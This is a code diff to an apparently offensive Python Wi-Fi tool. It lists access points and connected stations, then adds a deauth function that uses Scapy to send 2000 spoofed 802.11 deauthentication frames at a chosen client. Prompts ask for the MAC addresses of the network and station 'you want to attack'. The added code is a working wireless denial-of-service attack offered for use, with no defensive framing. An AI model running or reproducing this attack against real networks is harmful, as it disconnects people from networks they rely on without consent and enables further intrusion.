@@ -181,21 +181,13 @@ def sniffer(iface, ch):
 def output():
     dash = '-' * 60
     global AP
-    global client_AP
     print(dash)
     print('{:<20s}{:>10s}{:>25s}'.format('ESSID', 'CH', 'Access Points'))
     print(dash)
     for i in AP:
         ssid = AP[i]['ESSID']
         print('{:<20s}{:>10s}{:^40s}'.format(ssid, AP[i]['channel'], i))
-    print('\n\n')
-    dash = '-' * 80
-    print(dash)
-    print('{:<20s}{:>10s}{:>25s}{:>25s}'.format('Stations', 'CH', 'ESSID', 'BSSID'))
-    print(dash)
-    for i in client_AP:
-        print('{:<20s}{:>10s}{:^40s}{:>25}'.format(i, client_AP[i]['channel'], client_AP[i]['ESSID'],
-                                                   client_AP[i]['BSSID']))
+    print('\n')
 
 
 # display a progress bar for aesthetics
@@ -206,6 +198,29 @@ def progressbar():
         for i in range(100):
             bar.next()
             time.sleep(0.6)
+
+
+# output the stations of chosen network
+def output_client(net):
+    global client_AP
+
+    dash = '-' * 80
+    print(dash)
+    print('{:<20s}{:>10s}{:>25s}{:>25s}'.format('Stations', 'CH', 'ESSID', 'BSSID'))
+    print(dash)
+    for i in client_AP:
+        if client_AP[i]['BSSID'] == net:
+            print('{:<20s}{:>10s}{:^35s}{:>20}'.format(i, client_AP[i]['channel'], client_AP[i]['ESSID'],
+                                                       client_AP[i]['BSSID']))
+
+
+def deauth(target_mac, iface):
+    global  client_AP
+    bssid = client_AP[target_mac]['BSSID']
+    print("[+] attacking client ", target_mac, " on network ", bssid)
+    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
+    frame = RadioTap() / dot11 / Dot11Deauth()
+    sendp(frame, iface=iface, count=2000, inter=0.)
 
 
 if __name__ == "__main__":
@@ -226,3 +241,7 @@ if __name__ == "__main__":
     time.sleep(1)
     os.system('clear')
     output()
+    network = input("enter the mac address of the network you want to attack: ")
+    output_client(network)
+    victim = input("enter the mac address of the station you want to attack: ")
+    deauth(victim, interface)
